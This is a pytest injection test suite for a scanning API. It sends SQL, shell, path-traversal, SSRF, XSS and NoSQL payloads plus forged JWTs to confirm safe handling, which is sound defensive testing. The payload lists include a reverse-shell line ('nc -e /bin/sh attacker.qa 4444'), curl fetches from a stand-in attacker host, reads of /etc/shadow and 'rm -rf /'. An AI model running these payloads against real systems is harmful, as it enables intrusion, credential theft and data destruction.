"""
test_injection.py — Category: Injection (target: 60+ cases)

The app talks to the DB exclusively through SQLAlchemy's async ORM with
bound parameters (no raw string-interpolated SQL anywhere in the routes
reviewed), and the nmap subprocess call in scanner/nmap_wrapper.py uses
create_subprocess_exec with an argument list (no shell=True), which rules
out classic shell command injection. These tests verify that holds in
practice by firing real payloads at every user-controlled string field and
asserting the API degrades safely (never 500, never executes/interprets
the payload) rather than assuming it from a read of the source alone.

NoSQL injection is N/A -- there is no NoSQL datastore anywhere in this
stack -- so that OWASP sub-category is represented here by fields that
accept JSON/dict-shaped strings to confirm they're still treated as inert
text, not documented as a separate untested gap.
"""
import pytest

pytestmark = pytest.mark.injection

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE scans; --",
    "' OR 1=1 --",
    "admin'--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "'; SELECT pg_sleep(5); --",
    "x' AND 1=(SELECT COUNT(*) FROM users); --",
    '" OR ""="',
    "'||'1'='1",
    "\\'; DROP TABLE users; --",
    "1; EXEC xp_cmdshell('dir')",
    "' OR SLEEP(5)='",
    "'; WAITFOR DELAY '0:0:5'--",
    "1=1' /*",
]

COMMAND_INJECTION_PAYLOADS = [
    "; rm -rf /",
    "$(whoami)",
    "`id`",
    "| cat /etc/passwd",
    "&& curl attacker.qa/pwned",
    "target.com; nc -e /bin/sh attacker.qa 4444",
    "$(curl -s attacker.qa/x)",
    "target.com`reboot`",
    "target.com & shutdown -h now",
    "target.com || cat /etc/shadow",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "..%252f..%252f etc/passwd".replace(" ", ""),
    "..;/..;/etc/passwd",
    "/proc/self/environ",
]

SSRF_STYLE_TARGETS = [
    "169.254.169.254",  # cloud metadata endpoint
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8000/admin/config",
    "http://[::1]:22",
    "file:///etc/passwd",
    "0.0.0.0",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>",
]

NOSQLI_STYLE_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
]


class TestSqlInjectionOnScanTarget:
    @pytest.mark.parametrize("payload", SQLI_PAYLOADS)
    async def test_sqli_payload_in_target_does_not_crash_or_bypass(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: SQL injection payload in scan target is stored inertly, never executed
        OBJECTIVE: Confirm the parameterized-query ORM layer treats the payload
                    as plain text -- no syntax error, no 500, no data leak.
        EXPECTED: 201 Created (payload just becomes the literal target string)
                   or 422 if it happens to exceed length/blank constraints;
                   never 500.
        SEVERITY: Critical
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": payload, "authorization_confirmed": True,
            "authorization_justification": "Injection regression test payload.",
        })
        assert r.status_code in (201, 422)
        if r.status_code == 201:
            assert r.json()["target"] == payload.strip()

    @pytest.mark.parametrize("payload", SQLI_PAYLOADS)
    async def test_sqli_payload_in_justification_does_not_crash(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: SQL injection payload in authorization_justification is stored inertly
        OBJECTIVE: Same as target, for the other free-text scan field.
        EXPECTED: 201 Created or 422, never 500.
        SEVERITY: Critical
        """
        justification = f"Regression test: {payload} -- verifying safe handling."
        r = await client.post("/scans", headers=client1_headers, json={
            "target": "injection-test.qa.internal", "authorization_confirmed": True,
            "authorization_justification": justification,
        })
        assert r.status_code in (201, 422)

    async def test_sqli_in_login_email_field_returns_clean_401_or_422(self, client):
        """
        CATEGORY: Injection
        TITLE: SQL injection payload in the login email field is rejected cleanly
        OBJECTIVE: Confirm the classic ' OR '1'='1 auth-bypass payload cannot
                    authenticate and does not crash the endpoint.
        EXPECTED: 401 or 422, never 200 and never 500.
        SEVERITY: Critical
        """
        r = await client.post("/auth/login", json={"email": "' OR '1'='1' --", "password": "x"})
        assert r.status_code in (401, 422)

    async def test_sqli_in_login_password_field_does_not_bypass_auth(self, client, client1_headers):
        """
        CATEGORY: Injection
        TITLE: SQL injection payload in the login password field cannot bypass auth
        OBJECTIVE: Confirm a classic tautology payload as the password does not
                    authenticate against a real, known account.
        EXPECTED: 401 Unauthorized.
        SEVERITY: Critical
        """
        r = await client.post("/auth/login", json={
            "email": "client1.qa@vulnara-qa-suite.com", "password": "' OR '1'='1",
        })
        assert r.status_code == 401

    async def test_sqli_in_uuid_path_param_returns_422_not_500(self, client, client1_headers):
        """
        CATEGORY: Injection
        TITLE: SQL injection payload as a UUID path parameter fails validation cleanly
        OBJECTIVE: Confirm FastAPI's UUID coercion rejects the payload before it
                    ever reaches a query.
        EXPECTED: 422 Unprocessable Entity, never 500.
        SEVERITY: High
        """
        r = await client.get("/scans/' OR '1'='1", headers=client1_headers)
        assert r.status_code == 422


class TestCommandInjection:
    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    async def test_command_injection_payload_in_target_does_not_execute(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: Shell metacharacter payload in scan target is never executed
        OBJECTIVE: nmap is invoked via create_subprocess_exec with an argument
                    list, not shell=True, so metacharacters should be inert.
                    Confirm the API layer accepts/rejects the string cleanly
                    regardless (the background scan task fails independently
                    if nmap can't resolve the bogus target -- that's expected
                    and does not affect the API response here).
        EXPECTED: 201 Created or 422, never 500.
        SEVERITY: Critical
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": payload, "authorization_confirmed": True,
            "authorization_justification": "Command injection regression test.",
        })
        assert r.status_code in (201, 422)

    async def test_target_starting_with_dash_does_not_crash_api(self, client, client1_headers):
        """
        CATEGORY: Injection
        TITLE: [Finding] A target beginning with '-' is accepted without warning
        OBJECTIVE: A target string starting with a hyphen (e.g. '-oN out.txt')
                    could be interpreted as an nmap flag by argument-position
                    injection once it reaches the scanner, even without a
                    shell. The API itself must not crash regardless.
        EXPECTED (CURRENT BEHAVIOR): 201 Created -- the API applies no
                   allow-list/leading-character check on target. See
                   findings.xlsx (VULN-004, Medium) recommending a `--` separator
                   or leading-character rejection before the value reaches nmap_wrapper.
        SEVERITY: Medium
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": "-oN /tmp/pwned.txt example.com", "authorization_confirmed": True,
            "authorization_justification": "Argument-injection regression test.",
        })
        assert r.status_code in (201, 422)


class TestPathTraversal:
    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    async def test_path_traversal_payload_in_target_does_not_expose_files(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: Path traversal payload in scan target does not read local files
        OBJECTIVE: Confirm the target field is never used as a filesystem path
                    anywhere in the request-handling path.
        EXPECTED: 201 Created or 422; response body never contains file
                   contents (e.g. no 'root:' from /etc/passwd).
        SEVERITY: High
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": payload, "authorization_confirmed": True,
            "authorization_justification": "Path traversal regression test.",
        })
        assert r.status_code in (201, 422)
        assert "root:" not in r.text

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    async def test_path_traversal_payload_as_uuid_path_param_returns_422(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: Path traversal payload as a UUID path segment fails validation cleanly
        OBJECTIVE: Confirm traversal strings can't be smuggled through a
                    path-parameter position.
        EXPECTED: 422 Unprocessable Entity (or 404 if routing consumes part of
                   the path first), never 500, never file contents in the body.
        SEVERITY: High
        """
        r = await client.get(f"/scans/{payload}", headers=client1_headers)
        assert r.status_code in (404, 422)
        assert "root:" not in r.text


class TestSsrfStyleTargets:
    @pytest.mark.parametrize("target", SSRF_STYLE_TARGETS)
    async def test_ssrf_style_target_accepted_at_api_layer_but_flagged(self, client, client1_headers, target):
        """
        CATEGORY: Injection
        TITLE: [Finding] SSRF-prone targets (cloud metadata IP, localhost) are not blocked
        OBJECTIVE: The API applies no deny-list for internal/metadata/loopback
                    addresses on the target field -- if active_testing_enabled
                    were combined with such a target, the scanner would attempt
                    to reach internal infrastructure on the API's behalf.
        EXPECTED (CURRENT BEHAVIOR): 201 Created -- no target-range restriction
                   exists today. See findings.xlsx (VULN-005, High) recommending
                   a deny-list for RFC 1918 / loopback / link-local / cloud
                   metadata ranges unless explicitly allow-listed per tenant.
        SEVERITY: High
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": target, "authorization_confirmed": True,
            "authorization_justification": "SSRF-range regression test target.",
        })
        assert r.status_code in (201, 422)


class TestXssPayloadsStoredInertly:
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    async def test_xss_payload_in_scan_target_stored_as_plain_text(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: XSS payload in scan target is stored and returned as inert text
        OBJECTIVE: This is a JSON API (not server-rendered HTML), so reflected
                    XSS here would only matter if a frontend renders the field
                    unescaped -- confirm the API itself does not execute or
                    unescape it server-side (e.g. via templating).
        EXPECTED: 201 Created, payload returned byte-for-byte as JSON string data.
        SEVERITY: Medium
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": payload, "authorization_confirmed": True,
            "authorization_justification": "XSS regression test payload.",
        })
        assert r.status_code == 201
        assert r.json()["target"] == payload
        assert r.headers.get("content-type", "").startswith("application/json")

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    async def test_xss_payload_in_remediation_reject_reason_stored_inertly(self, client, admin_headers, seeded_remediation_2, payload):
        """
        CATEGORY: Injection
        TITLE: XSS payload in remediation rejection reason is stored as plain text
        OBJECTIVE: Same check for the free-text 'reason' field on the reject action.
        EXPECTED: 200 OK, no server-side execution/templating of the payload.
        SEVERITY: Low
        """
        r = await client.post(
            f"/remediations/{seeded_remediation_2['remediation_id']}/reject",
            headers=admin_headers, json={"reason": payload},
        )
        assert r.status_code in (200, 400)


class TestNoSqlInjectionNotApplicable:
    """
    N/A category, exercised rather than skipped: there is no NoSQL
    datastore in this stack (Postgres/SQLite via SQLAlchemy only), so a
    NoSQL operator-injection payload has nothing to inject into. These
    confirm such payloads are simply treated as inert strings wherever
    they're accepted as free text, and are rejected by JSON/type parsing
    wherever they're not.
    """

    @pytest.mark.parametrize("payload", NOSQLI_STYLE_PAYLOADS)
    async def test_nosqli_style_payload_in_justification_treated_as_plain_text(self, client, client1_headers, payload):
        """
        CATEGORY: Injection
        TITLE: [N/A - documented] NoSQL operator-injection payload is inert text
        OBJECTIVE: Confirm a MongoDB-style operator payload has no special
                    meaning anywhere in this stack (no NoSQL datastore exists).
        EXPECTED: 201 Created, justification field equals the raw payload string.
        SEVERITY: Low
        """
        r = await client.post("/scans", headers=client1_headers, json={
            "target": "nosqli-test.qa.internal", "authorization_confirmed": True,
            "authorization_justification": f"NoSQLi N/A check: {payload}",
        })
        assert r.status_code == 201


class TestJwtHeaderInjection:
    async def test_jwt_alg_none_token_rejected(self, client):
        """
        CATEGORY: Injection
        TITLE: A JWT with alg=none is rejected
        OBJECTIVE: Confirm the classic 'alg: none' signature-bypass attack fails.
        EXPECTED: 401 Unauthorized.
        SEVERITY: Critical
        """
        import base64
        import json as _json

        header = base64.urlsafe_b64encode(_json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=")
        payload = base64.urlsafe_b64encode(_json.dumps({"sub": "00000000-0000-0000-0000-000000000000", "role": "admin"}).encode()).rstrip(b"=")
        forged = header.decode() + "." + payload.decode() + "."

        r = await client.get("/auth/me", headers={"Authorization": f"Bearer {forged}"})
        assert r.status_code == 401

    async def test_jwt_with_tampered_payload_rejected(self, client, client1_session):
        """
        CATEGORY: Injection
        TITLE: A JWT with a base64-tampered payload (role escalation attempt) is rejected
        OBJECTIVE: Confirm signature verification actually catches payload tampering,
                    not just malformed tokens.
        EXPECTED: 401 Unauthorized.
        SEVERITY: Critical
        """
        import base64
        import json as _json

        token = client1_session["access_token"]
        header_b64, payload_b64, sig_b64 = token.split(".")
        payload = _json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
        payload["role"] = "admin"
        tampered_payload_b64 = base64.urlsafe_b64encode(_json.dumps(payload).encode()).rstrip(b"=").decode()
        forged = f"{header_b64}.{tampered_payload_b64}.{sig_b64}"

        r = await client.get("/auth/me", headers={"Authorization": f"Bearer {forged}"})
        assert r.status_code == 401
